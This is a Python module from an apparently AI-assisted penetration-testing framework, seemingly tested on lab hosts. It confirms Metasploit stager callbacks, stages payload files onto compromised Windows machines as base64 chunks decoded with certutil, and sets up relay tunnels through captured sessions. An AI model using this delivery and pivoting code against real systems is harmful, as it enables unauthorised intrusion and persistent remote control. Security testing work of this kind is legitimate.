"""Session flow: what a finished step hands over, how it travels, and what it proves."""
from __future__ import annotations

import json
import re
from pathlib import Path
from uuid import uuid4

from graph.paths import workspace_root
from orchestration.evidence import _registered_receipts
from runtime import msfservice, session_registry, tunnel
from runtime.session_delivery import finish_session_delivery


def produced_exec_facts(document, node_id):
    """Read each direct execCode output once, independently of its consumer count."""
    from graph import criteria

    return [(fact["arguments"][0], fact["arguments"][1])
            for fact in criteria.to_produce(document, node_id)
            if fact["type"] == "OR" and fact["signature"] == "execCode/2"]


def delivery_target_host(*, task=None, document=None, node_id="", host_map=None, scope=None):
    """Which machine the declared session is expected to call back from.

    A card may name it outright (``inputs.target_host``). Otherwise the graph already says it:
    this node's delivery exists to produce an ``execCode`` fact, and that fact names the host.
    Falling back to the node's own target address keeps the expectation non-empty either way --
    an empty expectation silently rejects the session the target really did dial back with
    (measured 2026-10-08, walk-130 node 7: the web-entry card carries no ``target_host``, the
    empty ``session_host`` failed ``SESSION_DELIVERY_HOST_MISMATCH``, and pc1's meterpreter
    was left unclaimed even though the loader had started it).
    """
    explicit = str(((task or {}).get("inputs") or {}).get("target_host") or "")
    if explicit:
        return explicit
    produced = produced_exec_facts(document, node_id) if document is not None else []
    if len(produced) == 1:
        logical = str(produced[0][0])
        return str((host_map or {}).get(logical) or logical)
    return str((scope or {}).get("host") or "")


def _finish_produced_session(*, document, node_id, host_map, executor, plan, rpc_conf, root,
                             timeout=40.0):
    """Bind a single declared session delivery to its exact output fact."""
    facts = produced_exec_facts(document, node_id)
    if len(facts) != 1:
        return {"state": "unknown",
                "reason": ("SESSION_OUTPUT_FACT_MISSING" if not facts
                           else "SESSION_OUTPUT_FACT_AMBIGUOUS")}
    logical, privilege = facts[0]
    return finish_session_delivery(
        executor=executor, plan=plan, rpc_conf=rpc_conf, root=root, node_id=node_id,
        host=str(host_map.get(logical) or logical), logical=logical,
        privilege=privilege, timeout=timeout)


def delivery_was_issued(plan_session, run_dir) -> bool:
    """Did this step really run the delivery it was handed?

    Whether to wait for the session must not depend on the model's own verdict: that makes the
    evidence circular. The model hedges, the run skips the wait, the session that did arrive is
    never adopted, and the machine check that could have settled the fact has nothing to read
    (measured 2026-10-08, walk-133 node 12: redis wrote the key, ssh started the stager, the
    model answered "uncertain", and the node failed with its session sitting unclaimed in the
    console). The step's own registered calls say whether the parked stager was used.
    """
    materials = ((plan_session or {}).get("declaration") or {}).get("materials") or {}
    needles = []
    for key in ("stager", "key_path", "remote_stager"):
        value = str(materials.get(key) or "")
        if not value:
            continue
        needles.append(value)
        #: A web entry never sees the control-end path: it carries the file's own name in the
        #: fetch URL (or in the command that starts it), so the name counts as the same material.
        name = Path(value.replace("\\", "/")).name
        if name:
            needles.append(name)
    if not needles:
        return True
    calls, _ = _registered_receipts(run_dir)
    for call in calls:
        text = json.dumps(call.get("request") or {}, ensure_ascii=False)
        if any(needle in text for needle in needles):
            return True
    return False


def stage_file_into_console(executor, carrier, *, source, remote, chunk=3000, temp=None):
    """Send a control-end file into a bound console by chunks, then decode it there.

    A console line has a ceiling, so the file travels as base64 chunks and is decoded where it
    lands. This is engine plumbing: the model should not have to keep chunk bookkeeping.
    """
    from runtime import session_io, session_registry, sessions
    encoded = executor(["/bin/sh", "-c", "base64 -w0 %s" % source], 120.0)
    blob = "".join(str(getattr(encoded, "stdout", "") or "").split())
    if not blob:
        raise ValueError("STAGE_FILE_UNREADABLE")
    staging = temp or (remote + ".b64")
    first = session_io.call_bound(
        carrier, {"tool": "cmd", "cmd": "del %s %s >nul 2>&1 & echo cleaned" % (staging, remote)},
        60.0)
    if not first["confirmed"]:
        raise ValueError("STAGE_FILE_CLEANUP_UNCONFIRMED")
    for index in range(0, len(blob), int(chunk)):
        part = blob[index:index + int(chunk)]
        written = session_io.call_bound(
            carrier, {"tool": "cmd", "cmd": "cmd /c echo %s>> %s" % (part, staging)}, 60.0)
        if not written["confirmed"] or written["command_rc"] != 0:
            raise ValueError("STAGE_FILE_CHUNK_UNCONFIRMED")
    decoded = session_io.call_bound(
        carrier, {"tool": "cmd", "cmd": "certutil -decode %s %s 2>&1" % (staging, remote)}, 120.0)
    #: 解码成没成，**按文件大小核对**，不按那句本地化的提示语 —— 真机是中文输出，
    #: 按英文 "decoded" 判会把装好了的当场判成没装（2026-10-08 walk-145 node 44 实测）。
    size = executor(["/bin/sh", "-c", "wc -c < %s" % source], 60.0)
    want = "".join(str(getattr(size, "stdout", "") or "").split())
    listed = session_io.call_bound(
        carrier, {"tool": "cmd", "cmd": "for %%I in (%s) do @echo AGVSIZE=%%~zI" % remote}, 60.0)
    text = str(getattr(listed.get("outcome"), "stdout", "") or "")
    found = re.search(r"AGVSIZE=(\d+)", text)
    if (not decoded["confirmed"] or not listed["confirmed"] or not want
            or not found or found.group(1) != want):
        raise ValueError("STAGE_FILE_DECODE_UNCONFIRMED")
    return {"remote": remote, "staging": staging, "chunks": (len(blob) + int(chunk) - 1) // int(chunk)}


def record_channels(*, node_id, document, host_map, root, delivery):
    """Resolve this node's explicit delivery carrier without relabelling it."""
    facts = produced_exec_facts(document, node_id)
    wanted = {
        str(host_map.get(host) or host)
        for host, _privilege in facts
    }
    if not wanted:
        return [], {
            "state": "not_applicable",
            "reason": "NO_EXEC_OUTPUT_FACT",
        }

    note = {
        "state": "not_established",
        "reason": "SESSION_DELIVERY_ASSOCIATION_MISSING",
    }
    if not isinstance(delivery, dict):
        return [], note

    note["delivery"] = dict(delivery)

    if str(delivery.get("node_id") or "") != str(node_id):
        note["reason"] = "SESSION_DELIVERY_NODE_MISMATCH"
        return [], note

    if delivery.get("state") != "completed":
        note["reason"] = str(
            delivery.get("reason") or "SESSION_DELIVERY_UNCONFIRMED")
        return [], note

    carrier = str(delivery.get("carrier") or "")
    if not carrier:
        note["reason"] = "SESSION_DELIVERY_CARRIER_MISSING"
        return [], note
    note["carrier"] = carrier

    rows = [
        row
        for row in session_registry.snapshot(root)
        if row.get("channel_id") == carrier
    ]
    if len(rows) != 1:
        note["reason"] = "SESSION_DELIVERY_CARRIER_NOT_REGISTERED"
        return [], note

    if rows[0].get("host") not in wanted:
        note["reason"] = "SESSION_DELIVERY_CARRIER_HOST_MISMATCH"
        return [], note

    note.update(
        state="registered",
        reason="CONSOLE_SESSION_OBSERVED",
    )
    return rows, note


def stager_path(port, *, windows=True) -> str:
    """这一计划自己那份 stager 的路径 —— **按端口命名，两个计划绝不共用**。

    为什么不能用固定名（2026-10-06 walk-62 实测）：所有计划都写 `/tmp/agv_session.exe` 时，
    后一个计划 armed 会把同一路径重编成"回调自己那个端口"的版本，而前一个计划失败后留下的取件服务
    还在跑 —— 于是"URL 指向哪份文件"与"这份文件是给哪个端口编的"不再配对，pc1 上的马连到了上一格的门
    （1090），控制台里 0 条会话。文件名里带端口，取件 URL 与内容就绑死了。
    """
    return "/tmp/agv_session_%d.%s" % (int(port), "exe" if windows else "py")


def card_declares_delivery(card_id, root=None):
    """Does this card say it hands something over (a session, or an entry it leaves)?

    Used only to keep the undecided list honest: a step that never promised a handle is not
    "undecided" when it has none. A card we cannot read is treated as if it did promise one --
    over-reporting is the safe direction.
    """
    if not card_id:
        return True
    try:
        from skills import lean as skills_lean

        card = skills_lean.load_card(str(card_id), root or workspace_root())
    except (ValueError, OSError):
        return True
    return bool(card.get("session") or card.get("provides_position")
                or "session" in (card.get("delivers") or []))


def delivery_gate(*, proved, declares_session, prepared, rpc_ready):
    """交付门禁：**声明了要交会话的步骤，"没准备好"要记成没成立，不是免检**。

    2026-10-07 桥评审点名：先前只在 `proved and plan_session` 时才验收交付，于是缺配置
    （没有 rpc/控制端）或 `begin_session_delivery()` 返回空的时候，**整条门禁被跳过** ——
    一张声明"这一步交出一条会话"的卡可以一次都没交就记成成立。

    返回 `(proved, reason)`；`reason` 非空表示按未成立记（原因具名，便于回溯到底缺哪一样）。
    """
    if not proved or not declares_session or prepared:
        return proved, ""
    return False, ("MIGRATION_NOT_CONFIGURED" if not rpc_ready else "DELIVERY_PLAN_EMPTY")


def activate_relay(*, executor, delivered, root, node_id, document, host_map, control,
                   run_dir, timeout, owner="", frozen_parent=None, frozen_targets=None):
    """会话交接成功后，**由代码自己**搭"控制端到这条会话"的中转（搭与用是两件事）。

    这一步独立失败：它只如实记下中转的结果，**绝不改写会话已经成功的事实**。登记表的快照行才带
    `registry_root`（回执里那份是脱敏副本），而载体的每一次使用都要走 `call_bound`，所以这里按
    `carrier` 从台账重取最终保留行。
    """
    carrier = str((delivered or {}).get("carrier") or "")
    retained = next((row for row in session_registry.snapshot(root)
                     if str(row.get("channel_id") or "") == carrier), None)
    state = {"state": "not_attempted", "reason": "TUNNEL_SESSION_UNBOUND"}
    if frozen_parent is not None:
        fields = ("channel_id", "kind", "session_id", "session_type",
                  "platform", "host", "logical", "uuid")
        if (not isinstance(frozen_parent, dict) or not retained
                or any(str(retained.get(key) or "")
                       != str(frozen_parent.get(key) or "") for key in fields)
                or retained.get("endpoint") != frozen_parent.get("endpoint")):
            return {"state": "unknown", "reason": "TUNNEL_PARENT_POSITION_INVALIDATED"}
    if retained:
        try:
            state = tunnel.init_for_session(
                executor, retained, run_dir=run_dir,
                targets=(tunnel.targets_for(document, host_map)
                         if frozen_targets is None else frozen_targets),
                owner=owner or ("relay-" + uuid4().hex), node=node_id,
                control_host=control, timeout=timeout)
        except (ValueError, OSError, RuntimeError, msfservice.MsfUnreachable) as error:
            state = {"state": "unknown",
                     "reason": type(error).__name__ + ": " + str(error)}
    return state
